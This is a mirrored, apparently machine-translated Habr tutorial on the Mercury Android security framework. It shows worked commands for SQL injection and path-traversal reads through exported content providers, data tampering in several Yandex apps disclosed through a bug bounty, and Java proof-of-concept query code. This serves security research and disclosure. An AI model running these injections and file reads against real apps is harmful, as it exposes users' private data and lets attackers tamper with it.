<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Mercury - herald of android bugs</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Hello ladies and gentlemen. Today we will look at how and how you can find vulnerabilities in your and other people's android applications. Also see w...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Mercury - herald of android bugs</h1><div class="post__text post__text-html js-mediator-article"><img src="https://habrastorage.org/storage2/6a5/a3a/534/6a5a3a534ed2a6c4bb621cce48b178fb.png" alt="image"><br><br>  Hello ladies and gentlemen.  Today we will look at how and how you can find vulnerabilities in your and other people's android applications.  Also see what an attacker can do with these vulnerabilities.  In addition, I will give examples of vulnerabilities that were found in the framework of the contest " <a href="">Hunting for bugs</a> " from the company Yandex. <br><a name="habracut"></a><br><h4>  Installation of experimental </h4><br>  As for programming for mobile devices, you can use hardware and emulators for research.  If there are no special problems for these devices, then installing an apk application on the emulator from google play causes difficulties.  A program from Yandex is the easiest way to get it. <br><br>  Let's analyze the options for obtaining an apk-file (some were already on the pages of the habr, but I repeat). 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <ol><li>  Download the application on a real device and transfer it to a computer using adb. <br><br><ul><li>  Check the availability of the device: <br><br><pre><code class="bash hljs">adb devices</code> </pre> <br></li><li>  All installed applications store their ‚Äúinstaller‚Äù in the / data / app folder: <br><br><pre> <code class="bash hljs">adb pull /data/app/ru.yandex.yandexmaps-1.apk C:\</code> </pre><br>  The Android OS uses the numbering of each installed program, so at the end it can be either ‚Äú-1‚Äù or ‚Äú-2‚Äù.  Or you can download all installed applications from the / data / app section for future analyzes: <br><br><pre> <code class="bash hljs">adb pull /data/app path_to_comp</code> </pre><br><div class="spoiler">  <b class="spoiler_title">We copy all programs from LG phone</b> <div class="spoiler_text"><img src="https://habrastorage.org/storage2/be5/13a/a02/be513aa023a9386a1b1f44e628fdaa76.png"></div></div></li></ul><br></li><li>  Use scripts c unofficial API. <br><br>  I use a variant that is written in python.  It is posted on <a href="https://github.com/egirault/googleplay-api">github</a> , there is an equivalent on java.  To use it, you will need an AndroidID of a real device that is attached to your or some other google account, as well as a login and password or AuthToken. <br><br>  AndroidID can be found by typing USSD-command: <br><br><pre> <code class="bash hljs">*<span class="hljs-comment"><span class="hljs-comment">#*#8255#*#*</span></span></code> </pre><br>  Here the aid parameter will be your AndroidID.  We enter all this in the config.py file.  Further, for example, you can find all Yandex programs on the market with the command: <br><br><pre> <code class="bash hljs">search.py yandex</code> </pre><br><div class="spoiler">  <b class="spoiler_title">Execution result</b> <div class="spoiler_text"><img src="https://habrastorage.org/storage2/ed2/55a/786/ed255a786fbc57b2d3f97c5c9341537f.png"></div></div><br></li><li>  Install Google play on emulator in a <a href="http://habrahabr.ru/post/146667/">shamanic</a> way. <br><br></li><li>  Download from sites, for example: <br>  <a href="http://4pda.ru/forum/">W3bsit3-dns.com</a> - there are all popular programs, including "cracked", which of course are for reference only. <br>  <a href="http://forum.xda-developers.com/">xda-developers</a> - mostly apk "free" or open-source programs. <br>  In this case, the application can be installed directly in the device through a browser. </li></ol><br><br>  Install applications in the emulator in two ways: <br><ul><li>  Via DDMS in Eclipse, click install application. </li><li>  Via adb command: <br><br><pre> <code class="bash hljs">adb install app.apk</code> </pre></li></ul><br><h4>  Toolkit for analyzing applications for vulnerabilities </h4><br>  In addition to the "manual" analysis, insert the "quotes" wherever possible, to search for vulnerabilities in android-applications, there are not many programs.  The most popular ones are: <br><ul><li>  Scandroid </li><li>  Mercury </li></ul><br>  <b>ScanDroid</b> is a ruby ‚Äã‚Äãscript that decompiles a dex-class from an application into java-code and searches for certain dangerous places according to certain rules specified by the user.  More information can be found in the <a href="http://www.net-security.org/dl/articles/Blueinfy_Rushil_ScanDroid_Paper.pdf">document</a> from the creators of the program or <a href="http://forum.reverse4you.org/showthread.php%3Ft%3D1175">translation</a> .  The source of the program is also presented there. <br><br>  <b>Mercury</b> is an open source framework written in python.  It is a set of interactive tools with which it can interact with all installed and running applications on the android device.  Here with him we will continue to meet. <br><br><h4>  Work with Mercury </h4><br>  The 2.2.0 version is currently available, it is completely redesigned compared to versions 1+.  But the download is available and that, and in the case of the first version of the installation is easier and does not require additional dependencies. <br><br>  You can download the required version from the <a href="http://labs.mwrinfosecurity.com/tools/2012/03/16/mercury/downloads">main site</a> or <a href="https://github.com/mwrlabs/mercury">github repository</a> .  The program itself consists of two parts: <br><ul><li>  The client is a python program that we run on a computer (works successfully in both * nix and windows). </li><li>  The agent (in 1+ versions this part was called the server) is an apk application that can be installed using any of the methods described above. </li></ul><br><h5>  Installing the client part </h5><br><h6>  Linux (Debian-like) </h6><br>  Install dependencies: <br><br><pre> <code class="bash hljs"> $ apt-get install build-essential python-dev python-setuptools $ easy_install --allow-hosts pypi.python.org protobuf==2.4.1 $ easy_install twisted==10.2.0</code> </pre><br>  Installing Mercury: <br><br><pre> <code class="bash hljs"> $ easy_install ./mercury-2.2.0-py2.7.egg</code> </pre><br><h6>  Windows </h6><br>  Install dependencies: <br><br><ol><li>  First, download the following programs: <br><ul><li>  Python: <a href="http://www.python.org/download/">www.python.org/download</a> </li><li>  setuptools: <a href="">pypi.python.org/pypi/setuptools/0.6c11</a> </li></ul><br></li><li>  Next, run them with the following parameters: <br><br><pre> <code class="bash hljs"> C:\Python27\Scripts\easy_install.exe --allow-hosts pypi.python.org protobuf==2.4.1 C:\Python27\Scripts\easy_install.exe pyopenssl C:\Python27\Scripts\easy_install.exe pyreadline C:\Python27\Scripts\easy_install.exe twisted==10.2.0</code> </pre><br></li><li>  Run the windows installer. </li></ol><br><h6>  Mac os x </h6><br>  There is no official manual, but since Xcode can be installed with command-line tools in which easy_install is available, when trying to install via command <br><br><pre> <code class="bash hljs"> $ easy_install ./mercury-2.2.0-py2.7.egg</code> </pre><br>  Everything ended with a successful installation. <br><br><div class="spoiler">  <b class="spoiler_title">Installation example</b> <div class="spoiler_text"><img src="https://habrastorage.org/storage2/e1c/27b/8dd/e1c27b8dd6b874b95f54599a41dca902.png"></div></div><br><h5>  Server installation </h5><br>  Installed by any of the methods described above: <br><ul><li>  adb install.apk </li><li>  Through DDMS. </li><li>  Download and install directly from the <a href="">site.</a> </li></ul><br><h5>  Customization </h5><br>  To connect the client and the server, we need the IP address of the device, in case it is an emulator, you need to do a port transfer with the command <br><br><pre> <code class="bash hljs">adb forward tcp:31415 tcp:31415</code> </pre><br>  Accordingly, the IP address for the scanner will be 127.0.0.1. <br><br>  On a real device, simply click on the one you need in the list of WiFi networks and a pop-up window will appear with detailed information about the quality, type of security and the IP address we need. <br><br>  Before you start from a computer, the application must be launched on the device.  Click on the Embeded server and set the switch to the ‚ÄúEnabled‚Äù position.  Starting with version 2, it is allowed to encrypt traffic via ssl and set a password. <br><br><div class="spoiler">  <b class="spoiler_title">An example of running an agent in an emulator</b> <div class="spoiler_text"><img src="https://habrastorage.org/storage2/b12/71c/4b5/b1271c4b530b291fde16724eba2a44b9.png"></div></div><br><h5>  We are looking for vulnerabilities </h5><br>  Join the device. <br>  Windows: <br><br><pre> <code class="bash hljs">C:\Python27\Scripts\&gt;python mercury console connect IP</code> </pre><br><div class="spoiler">  <b class="spoiler_title">Starting mercury console</b> <div class="spoiler_text"><img src="https://habrastorage.org/storage2/ea6/dfb/677/ea6dfb67768e056c5538235d1088204d.png"></div></div><br>  Unix: <br><br><pre> <code class="bash hljs"> mercury console connect IP</code> </pre><br>  The list of all installed modules is invoked by the following command: <br><br><pre> <code class="bash hljs">list</code> </pre><br><div class="spoiler">  <b class="spoiler_title">List command output</b> <div class="spoiler_text"><img src="https://habrastorage.org/storage2/8d9/884/43c/8d988443cae35bf518c7645c31760ec3.png"></div></div><br>  In the article we will consider not all, but only those that allow us to find vulnerabilities with real examples. <br><br>  The first experimental program will be <a href="">Sieve</a> , proposed by the developers. <br>  First we need to know the name of the program (package).  There are several options for how to do this: <br><ul><li>  Run the command: <br><br><pre> <code class="bash hljs">mercury&gt; run app.package.list</code> </pre><br>  And find your list.  Or you can add a filter, for example, in our case: <br><br><pre> <code class="bash hljs">mercury&gt; run app.package.list ‚Äìf sieve</code> </pre><br></li><li>  View the folder itself / data / data through any file manager. </li><li>  other‚Ä¶ . </li></ul><br>  As a result, we get the name - <i>com.mwr.example.sieve</i> <br><br>  In today's article we will look at vulnerabilities, one of which many did not expect to see in the android OS, yet it is more associated with the Web: <br><ul><li>  Sql injections. </li><li>  Read arbitrary files (LFI). </li></ul><br>  Well, let's continue.  Get information about the application: <br><br><pre> <code class="bash hljs">mercury&gt; run app.package.attacksurface com.mwr.example.sieve Attack Surface: 3 activities exported 0 broadcast receivers exported 2 content providers exported 2 services exported is debuggable</code> </pre><br>  <b>Activity</b> (Activity) - is a diagram of the presentation of Android applications.  For example, the main screen that the user sees when opening the program.  Or send a bug report to the developer. <br>  <b>Services</b> ‚Äî Performs background tasks without providing a user interface. <br>  <b>Content Providers</b> (Content Providers) - provides data to applications, most often to the sqlite database of the application.  You can call from other applications. <br>  <b>Broadcast Receiver</b> (Broadcast Receiver) - accepts system messages and implicit intents, can be used to respond to changes in the system state. <br><br>  More details about the structure of android-applications can be found on the pages of Habr, in particular the <a href="http://habrahabr.ru/post/115022/">Android Development Tutorial</a> .  In the meantime, let's deal with content providers.  See the list of available: <br><br><pre> <code class="bash hljs">mercury&gt; run app.provider.finduri com.mwr.example.sieve Scanning com.mwr.example.sieve... content://com.mwr.example.sieve.DBContentProvider/ content://com.mwr.example.sieve.FileBackupProvider/ content://com.mwr.example.sieve.DBContentProvider/Passwords content://com.mwr.example.sieve.DBContentProvider/Keys content://com.mwr.example.sieve.FileBackupProvider</code> </pre><br>  Mercury unpacks the apk file and then scans it using regular expressions for lines containing ‚Äúcontent: //‚Äù and the Providers block in the AndroidManifest.xml file.  In my practice, I came across when the developers, in order to protect themselves from this, encrypted strings with various methods, so I had to reverse the application manually. <br><br>  Since the content provider most often provides access to the sqlite database of the application, then we will parse the usual sql queries.  We will only focus on select, since I think there will be no problem with insert, update and delete requests. <br><br>  I think that Passwords is not the only one who begs me first, so let's start with this provider: <br><br><pre> <code class="bash hljs">mercury&gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords | _id | service | username | password | email | | 1 | habr | root | uVYNVnRWZxRM355wU3PqdCTpYc8= (Base64-encoded) | root@main.habr |</code> </pre><br>  And we get all the information from the query, now let's try the good old sql-injection.  Once again I remind you that in the android-application sqlite is used, we will make a query to sqlite_master (structure of the entire database): <br><br><pre> <code class="bash hljs">mercury&gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords --projection <span class="hljs-string"><span class="hljs-string">"* FROM sqlite_master--"</span></span> | <span class="hljs-built_in"><span class="hljs-built_in">type</span></span> | name | tbl_name | rootpage | sql | | table | android_metadata | android_metadata | 3 | CREATE TABLE android_metadata (locale TEXT) | | table | Passwords | Passwords | 4 | CREATE TABLE Passwords (_id INTEGER PRIMARY KEY,service TEXT,username TEXT,password BLOB,email) | | table | Key | Key | 5 | CREATE TABLE Key (Password TEXT PRIMARY KEY,pin TEXT ) | | index | sqlite_autoindex_Key_1 | Key | 6 | null |</code> </pre><br>  As you can see, our sql-injection was successful, and we got the whole database structure: tables and fields in them.  By the way, other sqlite functions work here, for example, you can find out the version number of the database: <br><br><pre> <code class="bash hljs">mercury&gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords --projection <span class="hljs-string"><span class="hljs-string">"sqlite_version();--"</span></span> | sqlite_version() | | 3.7.4 |</code> </pre><br>  The remaining vulnerabilities in this application will remain for the home task, and now we will return to the beginning of the article, where I promised to tell you about the findings in the applications from Yandex.  Thanks to mercury, the demonstration of operation was simplified, since at first it was necessary to write its own applications (PoC). <br><br><div class="spoiler">  <b class="spoiler_title">The main parts of the PoC source code</b> <div class="spoiler_text"><pre> <code class="java hljs"><span class="hljs-comment"><span class="hljs-comment">//    2      -:         sql-   ‚Äú* FROM sqlite_master--‚Äú //     // uri ‚Äì content provider // projectionArray ‚Äì   , : ‚Äú* FROM sqlite_master‚Äî‚Äú public static ArrayList&lt;String&gt; getColumns (ContentResolver resolver, String uri, String[] projectionArray) { ArrayList&lt;String&gt; columns = new ArrayList&lt;String&gt;(); try { Cursor c = resolver.query(Uri.parse(uri), projectionArray, null, null, null); if (c != null) { String [] colNames = c.getColumnNames(); c.close(); for (int k = 0; k &lt; colNames.length; k++) columns.add(colNames[k]); } } catch (Throwable t) {} return columns; } // ¬´ ¬ª,     -    // target ‚Äì content-provider // projection ‚Äì   public String make_shoot(String target, String projection) { ContentResolver r = getContentResolver(); String[] projectionArray = null; if (projection.length() &gt; 0) { projectionArray = new String[1]; int i = 0; projectionArray[i] = projection; } String data = ""; Cursor c = r.query(Uri.parse(target), projectionArray, null, null, null); if (c != null) { ArrayList&lt;String&gt; cols = getColumns(r, target, projectionArray); Iterator&lt;String&gt; it = cols.iterator(); String columns = ""; while (it.hasNext()) columns += it.next() + " | "; data += columns.substring(0, columns.length() - 3); data += "\n\n"; for (c.moveToFirst(); !c.isAfterLast(); c.moveToNext()) { int numOfColumns = c.getColumnCount(); for (int l = 0; l &lt; numOfColumns; l++) { try { data += c.getString(l); } catch (Exception e) { data += "(blob) " + Base64.encodeToString(c.getBlob(l), Base64.DEFAULT); } if (l != (numOfColumns - 1)) data += " | "; } } } return data; }</span></span></code> </pre><br></div></div><br>  Below, I‚Äôll demonstrate only a few of the vulnerabilities found due to the 90-day limit after sending error information. <br><br>  For example, the first application at the same time consider another type of vulnerabilities.  In addition to the sql injection through content providers, you can conduct a ‚Äúpath opening‚Äù attack for many system files and any file that the vulnerable application has access to.  A vulnerability of this kind was found in the Yandex.Disk application.  The content: // ru.yandex.disk.cache provider turned out to be accessible to any user.  First we check access to the system file: <br><br><pre> <code class="bash hljs">mercury&gt; run app.provider.read content://ru.yandex.disk.cache/../../../../../../../system/etc/hosts 127.0.0.1 localhost</code> </pre><br>  Now we will try to get access to something more interesting.  For example, to the database application.  Let me remind you that our applications use sqlite and the database is stored in a separate file in its own folder, to which only root and the same application have access: <br><br><pre> <code class="bash hljs">mercury&gt; run app.provider.read content://ru.yandex.disk.cache/../../../../../../../../data/data/ru.yandex.disk/databases/disk</code> </pre><br><div class="spoiler">  <b class="spoiler_title">Because of system characters, the output of the command under the cut</b> <div class="spoiler_text"><img src="https://habrastorage.org/storage2/d44/4b3/468/d444b346887ece7068ed2bfd31111f8d.png"></div></div><br>  As you can see, we get a list of all the files saved in Yandex.Disk.  In addition, the application uses the cache, so you can access any file that the user opened using the mobile application and did not clear the folder with temporary files after that.  For example, a user opened a document on working with Yandex.Disk: <br><br><pre> <code class="bash hljs">mercury&gt; run app.provider.read content://ru.yandex.disk.cache/../../../../../../../sdcard/Android/data/ru.yandex.disk/files/disk/readme.pdf</code> </pre><br>  To attack, we need to know the cache directory, but it is standard, and file names can be obtained from the application database by a previous query. <br><br>  In your PoC, such an address to the provider can be implemented through the function: <br><br><pre> <code class="java hljs">resolver.openInputStream(uri)</code> </pre><br>  Another vulnerability was found in the content provider responsible for the user's bookmarks, and allowed any application to change them: <br><br><pre> <code class="bash hljs">mercury&gt; run app.provider.query content://ru.yandex.yandexmaps.labels.LabelsProvider/mylabels geocode | label_name_tolower | lon | date | label_name | _id | lat , ,  , 2/417 | Neuronspace.ru | 37.5732 | 1352196244367 | Neuronspace.ru | 1 | 55.7137 , ,  , 2/417 | Work | 37.5732 | 1352196427356 | Work | 2 | 55.7137 : update content://ru.yandex.yandexmaps.labels.LabelsProvider/mylabels --string label_name_tolower=Home label_name=Home --<span class="hljs-built_in"><span class="hljs-built_in">where</span></span> _id=2 query content://ru.yandex.yandexmaps.labels.LabelsProvider/mylabels geocode | label_name_tolower | lon | date | label_name | _id | lat , ,  , 2/417 | Neuronspace.ru | 37.5732 | 1352196244367 | Neuronspace.ru | 1 | 55.7137 , ,  , 2/417 | Home | 37.5732 | 1352196427356 | Home | 2 | 55.7137</code> </pre><br>  So work has become home.  Or you can change the coordinates of the place and then the user will arrive at the wrong address ... <br><br>  The next vulnerable program is Yandex.Electrics.  Here, too, a vulnerability of the type sql-injection in the database with the possibility of data manipulation was discovered. <br><br><pre> <code class="bash hljs">mercury&gt; run app.provider.query content://ru.yandex.rasp/files --projection <span class="hljs-string"><span class="hljs-string">"* FROM sqlite_master--"</span></span> <span class="hljs-built_in"><span class="hljs-built_in">type</span></span> | name | tbl_name | rootpage | sql ..... table | android_metadata | android_metadata | 3 | CREATE TABLE android_metadata (locale TEXT) table | files | files | 4 | CREATE TABLE files (_id <span class="hljs-built_in"><span class="hljs-built_in">integer</span></span> primary key autoincrement, etag text, last_modified text, name text, region text,last_updated long,UNIQUE (name)) index | sqlite_autoindex_files_1 | files | 5 | null table | sqlite_sequence | sqlite_sequence | 6 | CREATE TABLE sqlite_sequence(name,seq) table | recent_stations | recent_stations | 7 | CREATE TABLE recent_stations (_id <span class="hljs-built_in"><span class="hljs-built_in">integer</span></span> primary key autoincrement, region text, is_meta int,station_id text, UNIQUE (station_id, region)) index | sqlite_autoindex_recent_stations_1 | recent_stations | 8 | null table | favourite_stations | favourite_stations | 9 | CREATE TABLE favourite_stations (_id <span class="hljs-built_in"><span class="hljs-built_in">integer</span></span> primary key autoincrement, station1 text, station1_meta int,station1_title text, station2 text,station2_meta int,station2_title text, current_from text, data_state int, identifier text, mirror_presented int, UNIQUE (identifier)) index | sqlite_autoindex_favourite_stations_1 | favourite_stations | 10 | null</code> </pre><br>  For an example of changing data, change the path to the file cache: <br><br><pre> <code class="bash hljs">mercury&gt; run app.provider.update content://ru.yandex.rasp/files --string name <span class="hljs-string"><span class="hljs-string">"/system/sdcard/hack.txt‚Äù --where _id=2 _id | etag | last_modified | name | region | last_updated ..... 2 | 9bcbdc0620af50eadead14cdee81a1ded08f0259 | null | /system/sdcard/hack.txt | 213 | 1352462705854 1 | 548f13c285590c4bc8df665613d2d80e7be4678a | null | /data/data/ru.yandex.rasp/cache/all_cities.cache | | 1352462705064</span></span></code> </pre><br>  Thanks to this vulnerability, an attacker could read and modify lists of favorite and recent stations.  Also, changing the path to the cache could ‚Äúdrop‚Äù the application or change the schedule if the user had no internet at that moment. <br><br>  The last, for today, vulnerable program is Yandex.Taxi.  This time I will give only a list and what could be done with them.  Several content providers turned out to be vulnerable: <br>  First: <i>content: //ru.yandex.taxi/taxi</i> <br>  Allowed to receive and change the list of available taxi user.  True, I don‚Äôt know, I‚Äôd be able to ‚Äúthrow‚Äù my car to the user, since the call goes through a live operator, but the numbers and other information of the nearest taxis could be obtained from the user.  The rest are not so interesting: <br><ul><li>  <i>content: //ru.yandex.taxi/history</i> - as the name implies, allowed access to the history, both search and calls. </li><li>  <i>content: //ru.yandex.taxi/delay_order</i> - access to order history. </li></ul><br>  Information of this kind will not need every attacker, but some "jealous" or "private" detectives would be interesting. <br><br>  But the main difference between such vulnerabilities is that a malicious application that does everything described above does not need any additional rights.  An attacker can offer the user to put a new wallpaper, and since most people have learned that if an application requires strange rights to be installed, for example, the video viewing application requires rights to send SMS and mount an sd card, he will first look at it.  But he will not see anything strange and will think that there will be no problems with the installation.  Or embed such functionality in another application, for example, in our any angry birds ... <br><br><h4>  Other Mercury Features </h4><br>  Also, the kit includes scanners that will go through all the installed programs on the device and try to automatically exploit the type of vulnerabilities that you choose.  Scanners for previous types of vulnerabilities: <br><ul><li>  scanner.provider.injection - tests for the possibility of a sql-injection </li><li>  scanner.provider.traversal - tests for the ability to read any available file </li></ul><br><div class="spoiler">  <b class="spoiler_title">Example of the work of the vulnerability scanner type disclosure</b> <div class="spoiler_text"><img src="https://habrastorage.org/storage2/f23/05c/99a/f2305c99a3d49d292c7311854398851e.png"></div></div><br>  First, a list of content providers that we will test is displayed, and at the end, the results are checked either by the commands above and / or by reversing. <br><br>  For some scanners, you will need to install the busybox program on your device: <br><br><pre> <code class="bash hljs">mercury&gt; run scanner.misc.readablefiles This <span class="hljs-built_in"><span class="hljs-built_in">command</span></span> requires BusyBox to complete. Run tools.setup.busybox and <span class="hljs-keyword"><span class="hljs-keyword">then</span></span> retry. mercury&gt; run tools.setup.busybox BusyBox installed. mercury&gt;</code> </pre><br><h4>  Conclusion </h4><br>  In this article, we got acquainted with the universal tool for searching vulnerabilities in Android applications - mercury.  Considered in detail how to work with one of the parts of the Android application - content providers.  Activity, Services, and Broadcast Receiver have remained unlit.  In the future, it is planned to find and show by the example of the found vulnerabilities how mercury can be used for this type of vulnerabilities.  It is also planned to get more closely acquainted with other programs for analysis. <br><br>  We thank the specialists from the Yandex Security Department for the prompt response!  And application developers - for a slow but sure;) fix for found usability. </div><p>Source: <a href="https://habr.com/ru/post/181450/">https://habr.com/ru/post/181450/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../181436/index.html">New login service Login with Amazon</a></li>
<li><a href="../181440/index.html">Geeksphone Peak Review - Phone on Firefox OS</a></li>
<li><a href="../181442/index.html">Do it yourself. City Christmas Tree</a></li>
<li><a href="../181444/index.html">4 Steps to Google without Higher Education</a></li>
<li><a href="../181448/index.html">Special economic zones: myths and / or reality?</a></li>
<li><a href="../181452/index.html">New Gmail Inbox Interface</a></li>
<li><a href="../181456/index.html">In the wake of intelligence 2</a></li>
<li><a href="../181458/index.html">BlackBerry 10+ Free Marmalade SDK</a></li>
<li><a href="../181460/index.html">Any whim for your money or Humble Bundle from Remedy Entertainment: manage to buy Alan Wake</a></li>
<li><a href="../181464/index.html">Django 1.6 alpha 1</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>